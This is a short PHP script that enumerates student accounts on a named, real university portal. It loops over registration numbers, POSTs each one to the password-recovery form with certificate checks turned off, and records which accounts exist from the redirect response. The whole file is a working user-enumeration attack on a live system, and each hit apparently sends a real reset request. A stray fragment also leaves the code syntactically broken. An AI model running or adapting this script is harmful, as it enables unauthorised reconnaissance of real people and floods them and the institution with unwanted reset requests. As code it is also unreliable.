<?php
$matriculas = [];
$url = 'https://alunos.cefet-rj.br/usuario/publico/usuario/solicitacaonovasenha.action';
for ($matricula = 001; $matricula < 1000; $matricula ++){
    $valor = "usuario=2300".$matricula."EVEINT";
    $ch = curl_init();
    //curl_setopt($ch, CURLOPT_VERBOSE, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://alunos.cefet-rj.br/usuario/publico/usuario/recuperacaosenha.action?br.com.asten.si.geral.web.spring.interceptors.AplicacaoWebChangeInterceptor.aplicacaoWeb=1"
    ]);
    //curl_setopt($ch, CURLOPT_POSTFIELDS,["usuario=2300".$matricula."EVEINT"]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $valor);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, 1);Referer: 
    //curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $server_output = curl_exec($ch);
    curl_close($ch);
    //$info = curl_getinfo($ch);
    $pos = strpos($server_output, "location");
    $loc = substr($server_output, $pos+10);
    $status = explode('=true',explode('?',$loc)[1])[0];
    if($status == "success"){
        $matriculas[] = explode('=',$valor)[1];
    }
    if($status == "errorUsuario"){
        //nao existe
    }
    echo (explode('=',$valor)[1] . " " . $status. PHP_EOL);
    usleep(10);
}

echo "EXISTENTES: ";
var_export($matriculas);
?>